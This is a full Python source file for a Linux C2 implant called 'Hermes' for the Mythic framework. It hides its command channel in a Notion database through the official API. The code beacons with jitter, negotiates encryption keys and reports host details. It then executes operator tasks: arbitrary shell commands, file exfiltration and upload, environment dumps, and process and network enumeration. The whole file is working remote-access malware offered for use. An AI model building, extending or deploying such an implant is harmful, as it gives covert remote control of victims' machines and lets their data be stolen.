#!/usr/bin/env python3
"""
Hermes - Mythic C2 Agent (Linux only, Python) — Notion transport.
Same crypto stack as agent.py (EKE / AESPSK + AES-256-CBC + HMAC-SHA256).
Communication channel: Notion database via the official REST API.

Send flow  : create page (direction="in",  agent_id=<uuid>, body=base64(data))
Receive flow: poll pages  (direction="out", agent_id=<uuid>, processed=False)
             read blocks → decode → mark processed
"""
import json
import base64
import os
import sys
import time
import random
import subprocess
import platform
import socket
import uuid as uuid_mod
import urllib.request
import urllib.error
import hashlib
import hmac as hmacc

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Config injected by builder (will be replaced)
CONFIG_UUID = "CONFIG_UUID"
CONFIG_NOTION_TOKEN = "CONFIG_NOTION_TOKEN"
CONFIG_NOTION_DB_ID = "CONFIG_NOTION_DB_ID"
CONFIG_INTERVAL = "CONFIG_INTERVAL"
CONFIG_JITTER = "CONFIG_JITTER"
CONFIG_KILLDATE = "CONFIG_KILLDATE"
CONFIG_USE_PSK = "false"
CONFIG_AESPSK = ""

NOTION_API_BASE = "https://api.notion.com/v1"
NOTION_VERSION = "2022-06-28"
CHUNK_SIZE = 1800          # chars per Notion rich_text block
RECV_TIMEOUT = 60          # seconds to wait for a server response


# ---------------------------------------------------------------------------
# Notion API helpers (urllib only — no third-party deps)
# ---------------------------------------------------------------------------

def _notion_req(token, method, path, body=None):
    """Raw Notion API call. Returns parsed JSON or {}."""
    url = NOTION_API_BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Notion-Version", NOTION_VERSION)
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return {}
    except Exception:
        return {}


def _create_page(token, db_id, agent_id, direction, encoded):
    """Create a Notion page carrying *encoded* (base64 string) in code blocks."""
    chunks = [encoded[i:i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    children = [
        {
            "object": "block",
            "type": "code",
            "code": {
                "language": "plain text",
                "rich_text": [{"type": "text", "text": {"content": chunk}}],
            },
        }
        for chunk in chunks
    ]
    payload = {
        "parent": {"database_id": db_id},
        "properties": {
            "uuid":      {"title": [{"text": {"content": str(uuid_mod.uuid4())}}]},
            "direction": {"select": {"name": direction}},
            "agent_id":  {"rich_text": [{"text": {"content": agent_id}}]},
            "processed": {"checkbox": False},
        },
        "children": children,
    }
    return _notion_req(token, "POST", "/pages", payload)


def _query_pending(token, db_id, agent_id, direction):
    """Return unprocessed pages for this agent in the given direction."""
    payload = {
        "filter": {
            "and": [
                {"property": "direction", "select":   {"equals": direction}},
                {"property": "processed", "checkbox": {"equals": False}},
                {"property": "agent_id",  "rich_text": {"equals": agent_id}},
            ]
        },
        "sorts": [{"timestamp": "created_time", "direction": "ascending"}],
    }
    result = _notion_req(token, "POST", f"/databases/{db_id}/query", payload)
    return result.get("results", [])


def _read_blocks(token, page_id):
    """Reassemble all code-block text from a page."""
    result = _notion_req(token, "GET", f"/blocks/{page_id}/children")
    encoded = ""
    for block in result.get("results", []):
        if block.get("type") == "code":
            for rt in block["code"].get("rich_text", []):
                encoded += rt["text"]["content"]
    return encoded


def _mark_processed(token, page_id):
    _notion_req(token, "PATCH", f"/pages/{page_id}",
                {"properties": {"processed": {"checkbox": True}}})


# ---------------------------------------------------------------------------
# Crypto (identical to agent.py)
# ---------------------------------------------------------------------------

def aes_encrypt(key, plain):
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plain) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor().update(padded) + cipher.encryptor().finalize()
    # rebuild encryptor — encryptor is one-shot
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    enc = encryptor.update(padded) + encryptor.finalize()
    msg = iv + enc
    sig = hmacc.new(key, msg, hashlib.sha256).digest()
    return msg + sig


def aes_decrypt(key, raw):
    if len(raw) < 48:
        return b""
    iv, sig, body = raw[:16], raw[-32:], raw[16:-32]
    if not hmacc.compare_digest(sig, hmacc.new(key, raw[:-32], hashlib.sha256).digest()):
        return b""
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    dec = decryptor.update(body) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(dec) + unpadder.finalize()


def rsa_keygen():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    priv = rsa.generate_private_key(public_exponent=65537, key_size=4096,
                                    backend=default_backend())
    pub_pem = priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.PKCS1)
    return pub_pem, priv


def rsa_decrypt_oaep(priv, ciphertext):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as ap
    return priv.decrypt(
        ciphertext,
        ap.OAEP(mgf=ap.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(), label=None))


# ---------------------------------------------------------------------------
# System helpers (identical to agent.py)
# ---------------------------------------------------------------------------

def get_user():
    try:
        return os.environ.get("USER") or os.environ.get("LOGNAME") or str(os.getuid())
    except Exception:
        return ""


def get_hostname():
    try:
        return socket.gethostname() or "unknown"
    except Exception:
        return "unknown"


def get_cwd():
    try:
        return os.getcwd()
    except Exception:
        return ""


def get_ips():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return [ip]
    except Exception:
        return ["127.0.0.1"]


# ---------------------------------------------------------------------------
# Agent
# ---------------------------------------------------------------------------

class HermesAgentNotion:
    def __init__(self):
        self.payload_uuid = CONFIG_UUID
        self.mythic_id = ""
        self.token = CONFIG_NOTION_TOKEN
        self.db_id = CONFIG_NOTION_DB_ID
        self.interval = int(CONFIG_INTERVAL)
        self.jitter = int(CONFIG_JITTER)
        self.killdate = CONFIG_KILLDATE
        self.aes_key = None
        self._cwd = get_cwd()
        self._running = True

    def _sleep_time(self):
        j = random.randint(0, min(self.jitter, 100)) / 100.0
        return max(1, self.interval * (1 - j))

    def _agent_id(self):
        return self.mythic_id if self.mythic_id else self.payload_uuid

    def _id_bytes(self):
        id_str = self._agent_id()
        return (id_str.encode() + b"\x00" * 36)[:36]

    # --- Transport -----------------------------------------------------------

    def _send(self, body_bytes, encrypt=True):
        """
        Post *body_bytes* to Notion (direction="in") then poll for the
        server's response (direction="out") with a RECV_TIMEOUT deadline.
        Returns raw response bytes (decrypted if needed), or b"" on failure.
        """
        if encrypt and self.aes_key:
            body_enc = aes_encrypt(self.aes_key, body_bytes)
        else:
            body_enc = body_bytes

        encoded = base64.b64encode(self._id_bytes() + body_enc).decode()
        agent_id = self._agent_id()

        # 1. Post message to Notion
        page = _create_page(self.token, self.db_id, agent_id, "in", encoded)
        if not page.get("id"):
            return b""

        # 2. Poll for server response
        deadline = time.time() + RECV_TIMEOUT
        while time.time() < deadline:
            pages = _query_pending(self.token, self.db_id, agent_id, "out")
            if pages:
                resp_page = pages[0]
                resp_id = resp_page["id"]
                raw_encoded = _read_blocks(self.token, resp_id)
                _mark_processed(self.token, resp_id)
                try:
                    raw = base64.b64decode(raw_encoded)
                except Exception:
                    return b""
                if len(raw) < 36:
                    return b""
                enc = raw[36:]
                if encrypt and self.aes_key:
                    return aes_decrypt(self.aes_key, enc)
                return enc
            time.sleep(2)

        return b""

    # --- Key exchange --------------------------------------------------------

    def _negotiate_key(self):
        pub_pem, priv = rsa_keygen()
        msg = {
            "action": "staging_rsa",
            "pub_key": base64.b64encode(pub_pem).decode(),
            "session_id": str(uuid_mod.uuid4()),
        }
        resp = self._send(json.dumps(msg).encode(), encrypt=False)
        if not resp:
            return False
        try:
            data = json.loads(resp)
        except Exception:
            return False
        key_b64 = data.get("session_key") or data.get("SessionKey")
        if not key_b64:
            return False
        self.aes_key = rsa_decrypt_oaep(priv, base64.b64decode(key_b64))
        new_uuid = data.get("uuid") or data.get("UUID")
        if new_uuid:
            self.mythic_id = str(new_uuid)
        return True

    # --- Checkin / tasking ---------------------------------------------------

    def checkin(self):
        use_psk = (CONFIG_USE_PSK or "").strip().lower() in ("true", "1", "yes")
        if use_psk and CONFIG_AESPSK.strip():
            try:
                key = base64.b64decode(CONFIG_AESPSK.strip())
                self.aes_key = key if len(key) == 32 else None
            except Exception:
                self.aes_key = None
            if not self.aes_key:
                return False
        elif not self.aes_key and not self._negotiate_key():
            return False

        ips = get_ips()
        msg = {
            "action": "checkin",
            "ips": ips,
            "os": "Linux",
            "user": get_user(),
            "host": get_hostname(),
            "pid": os.getpid(),
            "uuid": self.payload_uuid,
            "architecture": platform.machine() or "x86_64",
            "domain": "",
            "integrity_level": 2,
            "external_ip": ips[0] if ips else "",
            "process_name": "",
            "sleep_info": json.dumps({"interval": self.interval,
                                      "jitter": self.jitter,
                                      "killdate": self.killdate}),
            "cwd": self._cwd,
        }
        resp = self._send(json.dumps(msg).encode())
        if not resp:
            return False
        try:
            data = json.loads(resp)
        except Exception:
            return False
        if data.get("status") != "success":
            return False
        inner = data.get("message") if isinstance(data.get("message"), dict) else {}
        cb_id = (data.get("id") or data.get("agent_callback_id") or data.get("uuid")
                 or inner.get("id") or inner.get("agent_callback_id") or inner.get("uuid"))
        if cb_id is not None:
            self.mythic_id = str(cb_id)
        return True

    def get_tasking(self, responses):
        msg = {"action": "get_tasking", "tasking_size": -1, "responses": responses}
        resp = self._send(json.dumps(msg, default=str).encode())
        if not resp:
            return None
        try:
            return json.loads(resp)
        except Exception:
            return None

    # --- Task execution (identical to agent.py) ------------------------------

    def _get_param(self, params, key, default=""):
        if not isinstance(params, dict):
            return default
        value = params.get(key, default)
        if isinstance(value, dict):
            if key in value:
                return self._get_param(value, key, default)
            for v in value.values():
                if isinstance(v, str) and v:
                    return v
            return default
        if isinstance(value, str):
            return value
        return str(value) if value else default

    def run_task(self, task):
        task_id = task.get("id", "")
        cmd = task.get("command", "")
        params_str = task.get("parameters", "{}")
        params = {}
        try:
            if isinstance(params_str, str) and params_str.strip():
                params = json.loads(params_str) if params_str.strip().startswith("{") else {}
            elif isinstance(params_str, dict):
                params = params_str.copy()
        except Exception:
            params = {}

        out = {"task_id": task_id, "user_output": "", "completed": True, "status": "success"}
        try:
            if cmd == "shell":
                c = self._get_param(params, "command", "")
                if not c and isinstance(params_str, str) and params_str.strip() and not params_str.strip().startswith("{"):
                    c = params_str.strip()
                if not c:
                    out["user_output"] = "command parameter missing"
                    out["status"] = "error"
                else:
                    r = subprocess.run(["sh", "-c", c], capture_output=True, text=True, timeout=60, cwd=self._cwd or None)
                    out["user_output"] = (r.stdout or "") + (("\n" + r.stderr) if r.stderr else "")
                    if r.returncode != 0:
                        out["status"] = "error"
            elif cmd == "pwd":
                out["user_output"] = self._cwd or get_cwd()
            elif cmd == "ls":
                path = self._get_param(params, "path", ".")
                path = "." if not path or path == "{}" else path
                path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(path):
                    r = subprocess.run(["ls", "-lah", path], capture_output=True, text=True, timeout=10)
                    out["user_output"] = r.stdout if r.returncode == 0 else "\n".join(
                        f"{os.stat(os.path.join(path, e)).st_size:>8} {e}"
                        for e in sorted(os.listdir(path)))
                else:
                    out["user_output"] = f"No such directory: {path}"
                    out["status"] = "error"
            elif cmd == "cat":
                path = self._get_param(params, "path", "")
                if not path:
                    out["user_output"] = "path required"; out["status"] = "error"
                else:
                    path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                    if os.path.isfile(path):
                        with open(path, "r", errors="replace") as f:
                            out["user_output"] = f.read()
                    else:
                        out["user_output"] = f"File not found: {path}"; out["status"] = "error"
            elif cmd == "cd":
                path = self._get_param(params, "path", ".")
                path = "." if path == "{}" else path
                path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(path):
                    self._cwd = os.path.abspath(path); out["user_output"] = self._cwd
                else:
                    out["user_output"] = f"No such directory: {path}"; out["status"] = "error"
            elif cmd == "whoami":
                out["user_output"] = f"user: {get_user()}\nhost: {get_hostname()}"
            elif cmd == "sleep":
                try:
                    self.interval = int(self._get_param(params, "seconds", str(self.interval)))
                except ValueError:
                    pass
                out["user_output"] = f"Sleep interval set to {self.interval}s"
            elif cmd == "exit":
                self._running = False; out["user_output"] = "Exiting."
            elif cmd == "download":
                path = self._get_param(params, "path", "")
                if not path:
                    out["user_output"] = "path required"; out["status"] = "error"
                else:
                    path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                    if os.path.isfile(path):
                        with open(path, "rb") as f:
                            data = f.read()
                        out["user_output"] = base64.b64encode(data).decode()
                        out["download"] = {"full_path": os.path.abspath(path),
                                           "contents": base64.b64encode(data).decode()}
                    else:
                        out["user_output"] = f"File not found: {path}"; out["status"] = "error"
            elif cmd == "upload":
                remote = self._get_param(params, "path", "") or self._get_param(params, "remote_path", "")
                content_b64 = self._get_param(params, "contents", "") or self._get_param(params, "file", "")
                if content_b64 and remote:
                    remote = os.path.join(self._cwd, remote) if not os.path.isabs(remote) else remote
                    try:
                        os.makedirs(os.path.dirname(remote) or ".", exist_ok=True)
                        with open(remote, "wb") as f:
                            f.write(base64.b64decode(content_b64))
                        out["user_output"] = f"Uploaded to {remote}"
                    except Exception as e:
                        out["user_output"] = str(e); out["status"] = "error"
                else:
                    out["user_output"] = "Missing path or contents"; out["status"] = "error"
            elif cmd == "ps":
                r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "netstat":
                r = subprocess.run(["ss", "-tunap"], capture_output=True, text=True, timeout=30)
                if r.returncode != 0:
                    r = subprocess.run(["netstat", "-tunap"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "ifconfig":
                r = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=30)
                if r.returncode != 0:
                    r = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "env":
                out["user_output"] = "\n".join(f"{k}={v}" for k, v in os.environ.items())
            elif cmd == "systeminfo":
                lines = [
                    f"Hostname: {get_hostname()}", f"User: {get_user()}",
                    f"OS: {platform.system()} {platform.release()}",
                    f"Architecture: {platform.machine()}", f"PID: {os.getpid()}",
                    f"CWD: {self._cwd}", f"IPs: {', '.join(get_ips())}",
                ]
                out["user_output"] = "\n".join(lines)
            else:
                out["user_output"] = f"Unknown command: {cmd}"; out["status"] = "error"
        except subprocess.TimeoutExpired:
            out["user_output"] = "Command timed out"; out["status"] = "error"
        except Exception as e:
            out["user_output"] = str(e); out["status"] = "error"
        return out

    # --- Main loop -----------------------------------------------------------

    def main(self):
        if not self.checkin():
            return
        responses = []
        while self._running:
            if CONFIG_KILLDATE:
                try:
                    from datetime import datetime, timezone
                    kd = datetime.strptime(self.killdate.strip()[:10], "%Y-%m-%d").replace(tzinfo=timezone.utc)
                    if datetime.now(timezone.utc) > kd:
                        return
                except Exception:
                    pass
            data = self.get_tasking(responses)
            responses = []
            if data:
                for task in (data.get("tasks") or []):
                    resp = self.run_task(task)
                    if resp:
                        responses.append(resp)
            time.sleep(self._sleep_time())


if __name__ == "__main__":
    HermesAgentNotion().main()
